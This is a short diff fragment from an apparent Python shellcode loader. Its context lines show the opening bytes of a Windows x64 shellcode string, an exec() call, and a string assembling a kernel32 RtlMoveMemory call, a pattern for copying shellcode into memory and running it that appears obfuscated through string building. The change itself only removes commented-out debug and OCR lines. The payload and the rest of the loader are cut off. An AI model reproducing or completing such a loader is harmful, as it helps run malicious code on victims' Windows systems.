@@ -6,13 +6,6 @@ shellcode = b\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41
 
 '''
 
-# print(shellcode)
-
-# import pytesseract
-#
-# from PIL import Image
-# text = pytesseract.image_to_string(Image.open(r\\"1.png\\"))
-# print(text)
 exec(str)
 sttt = '''
 favwtgbatgghn = ctypes.windll.kernel32.RtlMoveMemor'''
